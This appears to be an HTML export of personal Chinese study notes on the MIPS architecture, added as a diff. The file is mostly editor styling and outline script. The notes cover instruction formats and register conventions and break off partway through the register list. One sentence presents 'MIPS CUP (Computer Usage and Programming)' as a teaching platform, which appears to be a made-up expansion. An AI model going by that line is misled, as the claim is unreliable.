@@ -1,0 +1,1478 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="generator" content="VNote">
+
+    <title>Mips_Study</title>
+
+    <style type="text/css">
+    div.code-toolbar > div.toolbar {
+    display: none;
+}
+
+    </style>
+
+    <style type="text/css">
+    *,
+*::before,
+*::after {
+  box-sizing: border-box;
+}
+
+.container-fluid {
+    width: 100%;
+    padding-right: 15px;
+    padding-left: 15px;
+    margin-right: auto;
+    margin-left: auto;
+}
+
+.col, .col-1, .col-10, .col-11, .col-12, .col-2, .col-3, .col-4, .col-5, .col-6, .col-7, .col-8, .col-9, .col-auto, .col-lg, .col-lg-1, .col-lg-10, .col-lg-11, .col-lg-12, .col-lg-2, .col-lg-3, .col-lg-4, .col-lg-5, .col-lg-6, .col-lg-7, .col-lg-8, .col-lg-9, .col-lg-auto, .col-md, .col-md-1, .col-md-10, .col-md-11, .col-md-12, .col-md-2, .col-md-3, .col-md-4, .col-md-5, .col-md-6, .col-md-7, .col-md-8, .col-md-9, .col-md-auto, .col-sm, .col-sm-1, .col-sm-10, .col-sm-11, .col-sm-12, .col-sm-2, .col-sm-3, .col-sm-4, .col-sm-5, .col-sm-6, .col-sm-7, .col-sm-8, .col-sm-9, .col-sm-auto, .col-xl, .col-xl-1, .col-xl-10, .col-xl-11, .col-xl-12, .col-xl-2, .col-xl-3, .col-xl-4, .col-xl-5, .col-xl-6, .col-xl-7, .col-xl-8, .col-xl-9, .col-xl-auto {
+    position: relative;
+    width: 100%;
+    min-height: 1px;
+    padding-right: 15px;
+    padding-left: 15px;
+}
+
+.col-12 {
+    -webkit-box-flex: 0;
+    -ms-flex: 0 0 100%;
+    flex: 0 0 100%;
+    max-width: 100%;
+}
+
+@media (min-width: 768px) {
+    .col-md-3 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 25%;
+        flex: 0 0 25%;
+        max-width: 25%;
+    }
+}
+
+@media (min-width: 768px) {
+    .col-md-9 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 75%;
+        flex: 0 0 75%;
+        max-width: 75%;
+    }
+}
+
+@media (min-width: 1200px) {
+    .col-xl-2 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 16.666667%;
+        flex: 0 0 16.666667%;
+        max-width: 16.666667%;
+    }
+}
+
+@media (min-width: 1200px) {
+    .col-xl-10 {
+        -webkit-box-flex: 0;
+        -ms-flex: 0 0 83.333333%;
+        flex: 0 0 83.333333%;
+        max-width: 83.333333%;
+    }
+}
+
+@media (min-width: 768px) {
+    .pt-md-3, .py-md-3 {
+        padding-top: 1rem!important;
+    }
+}
+
+@media (min-width: 768px) {
+    .pb-md-3, .py-md-3 {
+        padding-bottom: 1rem!important;
+    }
+}
+
+@media (min-width: 768px) {
+    .pl-md-5, .px-md-5 {
+        padding-left: 3rem!important;
+    }
+}
+
+.d-none {
+    display: none!important;
+}
+
+@media (min-width: 1200px) {
+    .d-xl-block {
+        display: block!important;
+    }
+}
+
+@media (min-width: 768px) {
+    .d-md-block {
+        display: block!important;
+    }
+}
+
+.bd-content {
+    -webkit-box-ordinal-group: 1;
+    -ms-flex-order: 0;
+    order: 0;
+}
+
+.bd-toc {
+    position: -webkit-sticky;
+    position: sticky;
+    top: 4rem;
+    height: calc(100vh - 10rem);
+    overflow-y: auto;
+}
+
+.bd-toc {
+    -webkit-box-ordinal-group: 2;
+    -ms-flex-order: 1;
+    order: 1;
+    padding-top: 1.5rem;
+    padding-bottom: 1.5rem;
+    font-size: .875rem;
+}
+
+.section-nav {
+    padding-left: 0;
+}
+
+.section-nav ul {
+    font-size: .875rem;
+    list-style-type: none;
+}
+
+.section-nav li {
+    font-size: .875rem;
+}
+
+.section-nav a {
+    color: inherit !important;
+    white-space: nowrap;
+}
+
+.row {
+    display: -webkit-box;
+    display: -ms-flexbox;
+    display: flex;
+    -ms-flex-wrap: wrap;
+    flex-wrap: wrap;
+    margin-right: -15px;
+    margin-left: -15px;
+}
+
+@media (min-width: 1200px) {
+    .flex-xl-nowrap {
+        flex-wrap: nowrap !important;
+    }
+}
+
+#floating-button {
+    width: 2.5rem;
+    height: 2.5rem;
+    border-radius: 50%;
+    background: #00897B;
+    position: fixed;
+    top: .5rem;
+    right: .5rem;
+    cursor: pointer;
+    box-shadow: 0px 2px 5px #666;
+}
+
+#floating-button .more {
+    color: #F5F5F5;
+    position: absolute;
+    top: 0;
+    display: block;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    text-align: center;
+    padding: 0;
+    margin: 0;
+    line-height: 2.5rem;
+    font-size: 2rem;
+    font-family: 'monospace';
+    font-weight: 300;
+}
+
+.hide-none {
+    display: none !important;
+}
+
+.col-expand {
+    -webkit-box-flex: 0;
+    -ms-flex: 0 0 100% !important;
+    flex: 0 0 100% !important;
+    max-width: 100% !important;
+    padding-right: 3rem !important;
+}
+
+.outline-bold {
+    font-weight: bolder !important;
+}
+
+@media print {
+    #floating-button {
+        display: none !important;
+    }
+}
+
+
+    #vx-content.vx-section-number, #vx-content.vx-section-number-2 h1, #vx-content.vx-section-number-3 h1, #vx-content.vx-section-number-3 h2 { counter-reset: section1 0 section2 0 section3 0 section4 0 section5 0 section6 0; }
+#vx-content.vx-section-number-1 h1, #vx-content.vx-section-number-2 h2, #vx-content.vx-section-number-3 h3 { counter-reset: section2 0 section3 0 section4 0 seciton5 0 section6 0; }
+#vx-content.vx-section-number-1 h2, #vx-content.vx-section-number-2 h3, #vx-content.vx-section-number-3 h4 { counter-reset: section3 0 section4 0 section5 0 section6 0; }
+#vx-content.vx-section-number-1 h3, #vx-content.vx-section-number-2 h4, #vx-content.vx-section-number-3 h5 { counter-reset: section4 0 section5 0 section6 0; }
+#vx-content.vx-section-number-1 h4, #vx-content.vx-section-number-2 h5 { counter-reset: section5 0 section6 0; }
+#vx-content.vx-section-number-1 h5 { counter-reset: section6 0; }
+#vx-content.vx-section-number-1 h1::before, #vx-content.vx-section-number-2 h2::before, #vx-content.vx-section-number-3 h3::before { counter-increment: section1 1; content: counter(section1) ". "; }
+#vx-content.vx-section-number-1 h2::before, #vx-content.vx-section-number-2 h3::before, #vx-content.vx-section-number-3 h4::before { counter-increment: section2 1; content: counter(section1) "." counter(section2) ". "; }
+#vx-content.vx-section-number-1 h3::before, #vx-content.vx-section-number-2 h4::before, #vx-content.vx-section-number-3 h5::before { counter-increment: section3 1; content: counter(section1) "." counter(section2) "." counter(section3) ". "; }
+#vx-content.vx-section-number-1 h4::before, #vx-content.vx-section-number-2 h5::before, #vx-content.vx-section-number-3 h6::before { counter-increment: section4 1; content: counter(section1) "." counter(section2) "." counter(section3) "." counter(section4) ". "; }
+#vx-content.vx-section-number-1 h5::before, #vx-content.vx-section-number-2 h6::before { counter-increment: section5 1; content: counter(section1) "." counter(section2) "." counter(section3) "." counter(section4) "." counter(section5) ". "; }
+#vx-content.vx-section-number-1 h6::before { counter-increment: section6 1; content: counter(section1) "." counter(section2) "." counter(section3) "." counter(section4) "." counter(section5) "." counter(section6) ". "; }
+#vx-content.vx-constrain-image-width img, #vx-content.vx-constrain-image-width div.vx-plantuml-graph > svg, #vx-content.vx-constrain-image-width div.vx-mermaid-graph, #vx-content.vx-constrain-image-width div.vx-flowchartjs-graph, #vx-content.vx-constrain-image-width div.vx-wavedrom-graph { max-width: 100% !important; height: auto !important; }
+figure { margin: auto; }
+figcaption { font-style: italic; }
+#vx-content.vx-image-align-center figure { text-align: center; }
+#vx-content.vx-image-align-center figcaption { text-align: center; }
+#vx-content.vx-image-align-center div.vx-plantuml-graph, #vx-content.vx-image-align-center div.vx-mermaid-graph, #vx-content.vx-image-align-center div.vx-flowchartjs-graph, #vx-content.vx-image-align-center div.vx-wavedrom-graph { margin-left: auto; margin-right: auto; }
+.vx-table-of-contents ol { list-style: none; }
+#vx-content.vx-section-number-1 .vx-table-of-contents ol { counter-reset: toc 0; }
+#vx-content.vx-section-number-1 .vx-table-of-contents ol li { counter-increment: toc 1; }
+#vx-content.vx-section-number-1 .vx-table-of-contents ol li::before { content: counters(toc, ".") ". "; font-family: cursive; }
+#vx-content.vx-section-number-2 .vx-table-of-contents > ol > li ol { counter-reset: toc 0; }
+#vx-content.vx-section-number-2 .vx-table-of-contents > ol > li ol li { counter-increment: toc 1; }
+#vx-content.vx-section-number-2 .vx-table-of-contents > ol > li ol li::before { content: counters(toc, ".") ". "; font-family: cursive; }
+#vx-content.vx-section-number-3 .vx-table-of-contents > ol > li > ol > li ol { counter-reset: toc 0; }
+#vx-content.vx-section-number-3 .vx-table-of-contents > ol > li > ol > li ol li { counter-increment: toc 1; }
+#vx-content.vx-section-number-3 .vx-table-of-contents > ol > li > ol > li ol li::before { content: counters(toc, ".") ". "; font-family: cursive; }
+.vx-header-anchor { visibility: hidden; vertical-align: middle; }
+.vx-header-anchor::after { content: attr(vx-data-anchor-icon); }
+#vx-content h1:hover .vx-header-anchor, #vx-content h2:hover .vx-header-anchor, #vx-content h3:hover .vx-header-anchor, #vx-content h4:hover .vx-header-anchor, #vx-content h5:hover .vx-header-anchor, #vx-content h6:hover .vx-header-anchor { visibility: visible; vertical-align: middle; }
+#vx-content.vx-indent-first-line p { text-indent: 2em; }
+body.vx-transparent-background { background-color: transparent !important; }
+#vx-content.vx-nonscrollable pre { white-space: pre-wrap !important; word-break: break-all !important; overflow: hidden !important; }
+#vx-content.vx-nonscrollable pre code { white-space: pre-wrap !important; word-break: break-all !important; }
+#vx-content.vx-nonscrollable code, #vx-content.vx-nonscrollable a { word-break: break-all !important; }
+body { margin: 0px auto; font-family: "YaHei Consolas Hybrid", "Noto Sans", "Helvetica Neue", "Segoe UI", Helvetica, Tahoma, Arial, Geneva, Georgia, Palatino, "Times New Roman", 冬青黑体, "Microsoft YaHei", 微软雅黑, "Microsoft YaHei UI", "WenQuanYi Micro Hei", 文泉驿雅黑, Dengxian, 等线体, STXihei, 华文细黑, "Liberation Sans", "Droid Sans", NSimSun, 新宋体, SimSun, 宋体, "Apple Color Emoji", "Segoe UI Emoji"; color: rgb(34, 34, 34); line-height: 1.5; padding: 16px; background-color: rgb(255, 255, 255); font-size: 16px; }
+h1, h2, h3, h4, h5, h6 { color: rgb(34, 34, 34); font-weight: bold; margin-top: 20px; margin-bottom: 10px; padding: 0px; }
+p, blockquote, ul, ol, dl, table { margin: 0.4em 0px; }
+p { padding: 0px; }
+h1 { font-size: 2rem; }
+h2 { font-size: 1.75rem; }
+h3 { font-size: 1.4rem; }
+h4 { font-size: 1.2rem; }
+h5 { font-size: 1rem; }
+h6 { font-size: 1rem; }
+a { color: rgb(0, 153, 255); margin: 0px; padding: 0px; vertical-align: baseline; text-decoration: none; word-break: break-word; }
+a:hover { text-decoration: underline; }
+a:visited { color: purple; }
+ul, ol { padding: 0px 0px 0px 24px; }
+li { line-height: 24px; }
+li ul, li ol { margin-left: 16px; }
+p, ul, ol { font-size: 16px; line-height: 24px; }
+pre { display: block; overflow: auto hidden; tab-size: 4; }
+code { font-family: "YaHei Consolas Hybrid", Consolas, Monaco, "Andale Mono", monospace, "Courier New"; color: rgb(142, 36, 170); word-break: break-word; }
+pre code { display: block; padding-left: 0.5em; padding-right: 0.5em; color: rgb(34, 34, 34); background-color: rgb(224, 224, 224); line-height: 1.5; font-family: "YaHei Consolas Hybrid", Consolas, Monaco, "Andale Mono", monospace, "Courier New"; white-space: pre; tab-size: 4; }
+aside { display: block; float: right; width: 390px; }
+blockquote { color: rgb(102, 102, 102); border-left: 0.5em solid rgb(122, 122, 122); padding: 0px 1em; }
+blockquote p { color: rgb(102, 102, 102); }
+hr { display: block; text-align: left; margin: 1em 0px; border: none; height: 2px; background-color: rgb(153, 153, 153); }
+table { padding: 0px; margin: 1rem 0.5rem; border-collapse: collapse; }
+table tr { border-top: 1px solid rgb(204, 204, 204); background-color: rgb(255, 255, 255); margin: 0px; padding: 0px; }
+table tr:hover { background-color: rgb(218, 218, 218); }
+table tr th { font-weight: bold; border: 1px solid rgb(204, 204, 204); margin: 0px; padding: 6px 13px; }
+table tr td { border: 1px solid rgb(204, 204, 204); margin: 0px; padding: 6px 13px; }
+table tr th :first-child, table tr td :first-child { margin-top: 0px; }
+table tr th :last-child, table tr td :last-child { margin-bottom: 0px; }
+div.vx-mermaid-graph { margin: 16px 0px; overflow-y: hidden; }
+div.vx-flowchartjs-graph { padding: 0px 5px; margin: 16px 0px; width: fit-content; overflow: hidden; }
+div.vx-wavedrom-graph { padding: 0px 5px; margin: 16px 0px; width: fit-content; overflow: hidden; }
+div.vx-plantuml-graph { padding: 5px 5px 0px; margin: 16px 0px; width: fit-content; overflow: hidden; }
+::selection { background-color: rgb(25, 118, 210); color: rgb(255, 255, 255); }
+::-webkit-scrollbar { background-color: rgb(245, 245, 245); width: 14px; height: 14px; border: none; }
+::-webkit-scrollbar-corner { background-color: rgb(245, 245, 245); }
+::-webkit-scrollbar-button { height: 14px; width: 14px; background-color: rgb(245, 245, 245); }
+::-webkit-scrollbar-button:hover { background-color: rgb(218, 218, 218); }
+::-webkit-scrollbar-button:active { background-color: rgb(192, 192, 192); }
+::-webkit-scrollbar-track { background-color: rgb(245, 245, 245); }
+::-webkit-scrollbar-thumb { border: none; background-color: rgb(205, 205, 205); }
+::-webkit-scrollbar-thumb:hover { background-color: rgb(192, 192, 192); }
+::-webkit-scrollbar-thumb:active { background-color: rgb(187, 187, 187); }
+::-webkit-scrollbar-button:horizontal:increment { background-image: url('data:image/svg+xml;utf8,<?xml version="1.0" encoding="UTF-8"?><svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19 12L31 24L19 36" stroke="%23222222" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg>'); background-repeat: no-repeat; background-size: contain; }
+::-webkit-scrollbar-button:horizontal:decrement { background-image: url('data:image/svg+xml;utf8,<?xml version="1.0" encoding="UTF-8"?><svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M31 36L19 24L31 12" stroke="%23222222" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg>'); background-repeat: no-repeat; background-size: contain; }
+::-webkit-scrollbar-button:vertical:increment { background-image: url('data:image/svg+xml;utf8,<?xml version="1.0" encoding="UTF-8"?><svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M36 18L24 30L12 18" stroke="%23222222" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg>'); background-repeat: no-repeat; background-size: contain; }
+::-webkit-scrollbar-button:vertical:decrement { background-image: url('data:image/svg+xml;utf8,<?xml version="1.0" encoding="UTF-8"?><svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M13 30L25 18L37 30" stroke="%23222222" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/></svg>'); background-repeat: no-repeat; background-size: contain; }
+#vx-content span.vx-search-match { color: rgb(34, 34, 34); background-color: rgb(77, 182, 172); }
+#vx-content span.vx-current-search-match { color: rgb(34, 34, 34); background-color: rgb(102, 187, 106); }
+.vx-alert { background-color: rgb(226, 237, 243) !important; padding: 12px 24px 12px 30px !important; border-radius: 0px !important; border-top: none !important; border-right: none !important; border-bottom: none !important; border-image: initial !important; border-left: 4px solid rgb(73, 139, 167) !important; color: inherit !important; }
+.vx-alert::before { background-color: rgb(73, 139, 167); border-radius: 100%; color: rgb(255, 255, 255); content: "!"; font-family: Dosis, "Source Sans Pro", "Helvetica Neue", Arial, sans-serif; font-size: 14px; font-weight: bold; left: -12px; line-height: 20px; position: absolute; height: 20px; width: 20px; text-align: center; top: 14px; }
+.alert-success, .alert-s { border-color: rgb(66, 185, 131) !important; background-color: rgb(212, 237, 218) !important; }
+.alert-success::before, .alert-s::before { background-color: rgb(66, 185, 131); }
+.alert-warning, .alert-w { border-color: rgb(255, 165, 2) !important; background-color: rgb(255, 243, 205) !important; }
+.alert-warning::before, .alert-w::before { background-color: rgb(255, 165, 2); }
+.alert-info, .alert-i { border-color: rgb(112, 161, 255) !important; background-color: rgb(204, 229, 255) !important; }
+.alert-info::before, .alert-i::before { background-color: rgb(112, 161, 255); }
+.alert-danger, .alert-d { border-color: rgb(255, 71, 87) !important; background-color: rgb(248, 215, 218) !important; }
+.alert-danger::before, .alert-d::before { background-color: rgb(255, 71, 87); }
+.alert-light { border-color: rgb(193, 193, 193) !important; background-color: rgb(248, 248, 248) !important; }
+.alert-light::before { background-color: rgb(193, 193, 193); }
+.alert-dark { border-color: rgb(72, 72, 72) !important; background-color: rgb(240, 240, 240) !important; }
+.alert-dark::before { background-color: rgb(72, 72, 72); }
+code[class*="language-"], pre[class*="language-"] { color: black; background: none; font-size: 1em; text-align: left; white-space: pre; word-spacing: normal; word-break: normal; overflow-wrap: normal; line-height: 1.5; tab-size: 4; hyphens: none; }
+pre[class*="language-"]::selection, pre[class*="language-"] ::selection, code[class*="language-"]::selection, code[class*="language-"] ::selection { text-shadow: none; background-color: rgb(25, 118, 210); color: rgb(255, 255, 255); }
+@media print {
+  code[class*="language-"], pre[class*="language-"] { text-shadow: none; }
+}
+pre[class*="language-"] { padding: 1em; margin: 0.5em 0px; overflow: auto; }
+:not(pre) > code[class*="language-"], pre[class*="language-"] { background: rgb(237, 232, 228); }
+:not(pre) > code[class*="language-"] { padding: 0.1em; border-radius: 0.3em; white-space: normal; }
+.token.comment, .token.prolog, .token.doctype, .token.cdata { color: slategray; }
+.token.punctuation { color: rgb(153, 153, 153); }
+.token.namespace { opacity: 0.7; }
+.token.property, .token.tag, .token.boolean, .token.number, .token.constant, .token.symbol, .token.deleted { color: rgb(153, 0, 85); }
+.token.selector, .token.attr-name, .token.string, .token.char, .token.builtin, .token.inserted { color: rgb(102, 153, 0); }
+.token.operator, .token.entity, .token.url, .language-css .token.string, .style .token.string { color: rgb(154, 110, 58); }
+.token.atrule, .token.attr-value, .token.keyword { color: rgb(0, 119, 170); }
+.token.function, .token.class-name { color: rgb(221, 74, 104); }
+.token.regex, .token.important, .token.variable { color: rgb(238, 153, 0); }
+.token.important, .token.bold { font-weight: bold; }
+.token.italic { font-style: italic; }
+.token.entity { cursor: help; }
+pre[class*="language-"].line-numbers { position: relative; padding-left: 3.8em; counter-reset: linenumber 0; }
+pre[class*="language-"].line-numbers > code { position: relative; white-space: inherit; }
+.line-numbers .line-numbers-rows { position: absolute; pointer-events: none; top: 0px; font-size: 100%; left: -3.8em; width: 3em; letter-spacing: -1px; border-right: 1px solid rgb(153, 153, 153); user-select: none; }
+.line-numbers-rows > span { display: block; counter-increment: linenumber 1; }
+.line-numbers-rows > span::before { content: counter(linenumber); color: rgb(153, 153, 153); display: block; padding-right: 0.8em; text-align: right; }
+div.code-toolbar { position: relative; }
+div.code-toolbar > .toolbar { position: absolute; top: 0.3em; right: 0.2em; transition: opacity 0.3s ease-in-out 0s; opacity: 0; }
+div.code-toolbar:hover > .toolbar { opacity: 1; }
+div.code-toolbar:focus-within > .toolbar { opacity: 1; }
+div.code-toolbar > .toolbar .toolbar-item { display: inline-block; }
+div.code-toolbar > .toolbar a { cursor: pointer; }
+div.code-toolbar > .toolbar button { background: none; border: 0px; color: inherit; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; font-family: inherit; line-height: normal; overflow: visible; padding: 0px; user-select: none; }
+div.code-toolbar > .toolbar a, div.code-toolbar > .toolbar button, div.code-toolbar > .toolbar span { color: rgb(187, 187, 187); font-size: 0.8em; padding: 0px 0.5em; background: rgba(224, 224, 224, 0.2); box-shadow: rgba(0, 0, 0, 0.2) 0px 2px 0px 0px; border-radius: 0.5em; }
+div.code-toolbar > .toolbar a:hover, div.code-toolbar > .toolbar a:focus, div.code-toolbar > .toolbar button:hover, div.code-toolbar > .toolbar button:focus, div.code-toolbar > .toolbar span:hover, div.code-toolbar > .toolbar span:focus { color: inherit; text-decoration: none; }
+.vx-image-view-image { transition: all 0.3s ease 0s; }
+.vx-modal-box { display: none; position: fixed; z-index: 1000; padding-top: 50px; left: 0px; top: 0px; width: 100%; height: 100%; overflow: hidden; background-color: rgba(51, 56, 66, 0.85); }
+.vx-modal-content { margin: auto; display: block; width: auto; height: auto; cursor: move; }
+.vx-modal-content { animation-name: zoom; animation-duration: 0.6s; }
+@-webkit-keyframes zoom { 
+  0% { transform: scale(0); }
+  100% { transform: scale(1); }
+}
+@keyframes zoom { 
+  0% { transform: scale(0); }
+  100% { transform: scale(1); }
+}
+span.vx-modal-close { position: absolute; z-index: 1000; top: 15px; right: 35px; color: rgb(171, 178, 191); font-size: 40px; font-weight: bold; transition: all 0.3s ease 0s; }
+span.vx-modal-close:hover, span.vx-modal-close:focus { color: rgb(215, 218, 224); text-decoration: none; cursor: pointer; }
+ul.contains-task-list { list-style-type: none; }
+.vx-alert { position: relative; padding: 0.75rem 1.25rem; margin-bottom: 1rem; border: 1px solid transparent; border-radius: 0.25rem; }
+.alert-primary { color: rgb(0, 64, 133); background-color: rgb(204, 229, 255); border-color: rgb(184, 218, 255); }
+.alert-secondary { color: rgb(56, 61, 65); background-color: rgb(226, 227, 229); border-color: rgb(214, 216, 219); }
+.alert-success { color: rgb(21, 87, 36); background-color: rgb(212, 237, 218); border-color: rgb(195, 230, 203); }
+.alert-info { color: rgb(12, 84, 96); background-color: rgb(209, 236, 241); border-color: rgb(190, 229, 235); }
+.alert-warning { color: rgb(133, 100, 4); background-color: rgb(255, 243, 205); border-color: rgb(255, 238, 186); }
+.alert-danger { color: rgb(114, 28, 36); background-color: rgb(248, 215, 218); border-color: rgb(245, 198, 203); }
+.alert-light { color: rgb(129, 129, 130); background-color: rgb(254, 254, 254); border-color: rgb(253, 253, 254); }
+.alert-dark { color: rgb(27, 30, 33); background-color: rgb(214, 216, 217); border-color: rgb(198, 200, 202); }
+
+    </style>
+
+    <script type="text/javascript">
+        var vxOutlineToc = [];
+
+var setVisible = function(node, visible) {
+    var cl = 'hide-none';
+    if (visible) {
+        node.classList.remove(cl);
+    } else {
+        node.classList.add(cl);
+    }
+};
+
+var isVisible = function(node) {
+    var cl = 'hide-none';
+    return !node.classList.contains(cl);
+};
+
+var setPostContentExpanded = function(node, expanded) {
+    var cl = 'col-expand';
+    if (expanded) {
+        node.classList.add(cl);
+    } else {
+        node.classList.remove(cl);
+    }
+};
+
+var setOutlinePanelVisible = function(visible) {
+    var outlinePanel = document.getElementById('outline-panel');
+    var postContent = document.getElementById('post-content');
+
+    setVisible(outlinePanel, visible);
+    setPostContentExpanded(postContent, !visible);
+};
+
+var isOutlinePanelVisible = function() {
+    var outlinePanel = document.getElementById('outline-panel');
+    return isVisible(outlinePanel);
+};
+
+window.addEventListener('load', function() {
+    var outlinePanel = document.getElementById('outline-panel');
+    outlinePanel.style.display = 'initial';
+
+    var floatingContainer = document.getElementById('container-floating');
+    floatingContainer.style.display = 'initial';
+
+    var outlineContent = document.getElementById('outline-content');
+    var postContent = document.getElementById('post-content');
+
+    // Escape @text to Html.
+    var escapeHtml = function(text) {
+        var map = {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#039;'
+        };
+
+        return text.replace(/[&<>"']/g, function(m) { return map[m]; });
+    }
+
+    // Fetch the outline.
+    var headers = postContent.querySelectorAll("h1, h2, h3, h4, h5, h6");
+    vxOutlineToc = [];
+    for (var i = 0; i < headers.length; ++i) {
+        var header = headers[i];
+
+        vxOutlineToc.push({
+            level: parseInt(header.tagName.substr(1)),
+            anchor: header.id,
+            title: escapeHtml(header.textContent)
+        });
+    }
+
+    if (vxOutlineToc.length == 0) {
+        setOutlinePanelVisible(false);
+        setVisible(floatingContainer, false);
+        return;
+    }
+
+    var baseLevel = baseLevelOfToc(vxOutlineToc);
+    var tocTree = tocToTree(toPerfectToc(vxOutlineToc, baseLevel), baseLevel);
+
+    outlineContent.innerHTML = tocTree;
+    setOutlinePanelVisible(true);
+    setVisible(floatingContainer, true);
+});
+
+// Return the topest level of @vxOutlineToc, starting from 1.
+var baseLevelOfToc = function(p_toc) {
+    var level = -1;
+    for (i in p_toc) {
+        if (level == -1) {
+            level = p_toc[i].level;
+        } else if (level > p_toc[i].level) {
+            level = p_toc[i].level;
+        }
+    }
+
+    if (level == -1) {
+        level = 1;
+    }
+
+    return level;
+};
+
+// Handle wrong title levels, such as '#' followed by '###'
+var toPerfectToc = function(p_toc, p_baseLevel) {
+    var i;
+    var curLevel = p_baseLevel - 1;
+    var perfToc = [];
+    for (i in p_toc) {
+        var item = p_toc[i];
+
+        // Insert empty header.
+        while (item.level > curLevel + 1) {
+            curLevel += 1;
+            var tmp = { level: curLevel,
+                        anchor: '',
+                        title: '[EMPTY]'
+                      };
+            perfToc.push(tmp);
+        }
+
+        perfToc.push(item);
+        curLevel = item.level;
+    }
+
+    return perfToc;
+};
+
+var itemToHtml = function(item) {
+    return '<a href="#' + item.anchor + '" title="' + item.title + '" data="' + item.anchor + '">' + item.title + '</a>';
+};
+
+// Turn a perfect toc to a tree using <ul>
+var tocToTree = function(p_toc, p_baseLevel) {
+    var i;
+    var front = '<li>';
+    var ending = ['</li>'];
+    var curLevel = p_baseLevel;
+    for (i in p_toc) {
+        var item = p_toc[i];
+        if (item.level == curLevel) {
+            front += '</li>';
+            front += '<li>';
+            front += itemToHtml(item);
+        } else if (item.level > curLevel) {
+            // assert(item.level - curLevel == 1)
+            front += '<ul>';
+            ending.push('</ul>');
+            front += '<li>';
+            front += itemToHtml(item);
+            ending.push('</li>');
+            curLevel = item.level;
+        } else {
+            while (item.level < curLevel) {
+                var ele = ending.pop();
+                front += ele;
+                if (ele == '</ul>') {
+                    curLevel--;
+                }
+            }
+            front += '</li>';
+            front += '<li>';
+            front += itemToHtml(item);
+        }
+    }
+    while (ending.length > 0) {
+        front += ending.pop();
+    }
+    front = front.replace("<li></li>", "");
+    front = '<ul>' + front + '</ul>';
+    return front;
+};
+
+var toggleMore = function() {
+    if (vxOutlineToc.length == 0) {
+        return;
+    }
+
+    var p = document.getElementById('floating-more');
+    if (isOutlinePanelVisible()) {
+        p.textContent = '<';
+        setOutlinePanelVisible(false);
+    } else {
+        p.textContent = '>';
+        setOutlinePanelVisible(true);
+    }
+};
+
+window.addEventListener('scroll', function() {
+    if (vxOutlineToc.length == 0 || !isOutlinePanelVisible()) {
+        return;
+    }
+
+    var postContent = document.getElementById('post-content');
+    var scrollTop = document.documentElement.scrollTop
+                    || document.body.scrollTop
+                    || window.pageYOffset;
+    var eles = postContent.querySelectorAll("h1, h2, h3, h4, h5, h6");
+
+    if (eles.length == 0) {
+        return;
+    }
+
+    var idx = -1;
+    var biaScrollTop = scrollTop + 50;
+    for (var i = 0; i < eles.length; ++i) {
+        if (biaScrollTop >= eles[i].offsetTop) {
+            idx = i;
+        } else {
+            break;
+        }
+    }
+
+    var header = '';
+    if (idx != -1) {
+        header = eles[idx].id;
+    }
+
+    highlightItemOnlyInOutline(header);
+});
+
+var highlightItemOnlyInOutline = function(id) {
+    var cl = 'outline-bold';
+    var outlineContent = document.getElementById('outline-content');
+    var eles = outlineContent.querySelectorAll("a");
+    var target = null;
+    for (var i = 0; i < eles.length; ++i) {
+        var ele = eles[i];
+        if (ele.getAttribute('data') == id) {
+            target = ele;
+            ele.classList.add(cl);
+        } else {
+            ele.classList.remove(cl);
+        }
+    }
+
+    // TODO: scroll target into view within the outline panel scroll area.
+};
+
+    </script>
+
+    <!-- VX_SCRIPTS_PLACEHOLDER -->
+
+    <!-- VX_HEAD_PLACEHOLDER -->
+</head>
+<body class="vx-transparent-background">
+    <div class="container-fluid">
+    <div class="row flex-xl-nowrap">
+        <!-- VX_OUTLINE_PANEL_START -->
+        <div id="outline-panel" style="display:none;" class="d-none d-md-block d-xl-block col-md-3 col-xl-2 bd-toc">
+            <div id="outline-content" class="section-nav"></div>
+        </div>
+        <!-- VX_OUTLINE_PANEL_END -->
+
+        <div id="post-content" class="col-12 col-md-9 col-xl-10 py-md-3 pl-md-5 bd-content">
+        <div id="vx-content" class="vx-constrain-image-width line-numbers"><h1 id="mips_study" class="source-line" data-source-line="0">Mips_Study<a class="vx-header-anchor" href="#mips_study" vx-data-anchor-icon="¶"></a></h1>
+<h2 id="初始信息收集" class="source-line" data-source-line="2">初始信息收集<a class="vx-header-anchor" href="#初始信息收集" vx-data-anchor-icon="¶"></a></h2>
+<p class="source-line" data-source-line="4">MIPS（Microprocessor without Interlocked Pipeline Stages）是一个广泛使用的RISC（Reduced Instruction Set Computer）处理器架构。MIPS CUP（Computer Usage and Programming）是一个教学平台，旨在帮助学生理解和实践MIPS架构。以下是一些关于MIPS架构和寄存器的基本知识：</p>
+<ol>
+<li class="source-line" data-source-line="6">MIPS架构概述<br>
+MIPS是一种RISC架构，设计理念是使用简单的指令集来实现高效的处理。MIPS处理器通常具有以下特点：</li>
+</ol>
+<p class="source-line" data-source-line="9">固定长度的指令：所有指令都是32位。<br>
+简单的指令格式：包括R型（寄存器）、I型（立即数）和J型（跳转）三种格式。<br>
+统一的寄存器文件：使用一组寄存器来执行大多数操作。<br>
+2. MIPS寄存器文件<br>
+MIPS有32个通用寄存器（$0 到 $31），每个寄存器都是32位的。它们分别有不同的名字和用途：</p>
+<p class="source-line" data-source-line="15">$0: 常量寄存器，总是0。<br>
+$1: 也被称为at，通常保留给汇编器使用。<br>
+$2-$3: v0 和 v1，用于存放函数返回值。<br>
+$4-$7: a0 到 a3，用于函数的前四个参数。<br>
+$8-$15: t0 到 t7，临时寄存器，用于计算等临时数据，不保留函数调用的值。<br>
+$16-$23: s0 到 s7，保存寄存器，用于存储需要保留的值。<br>
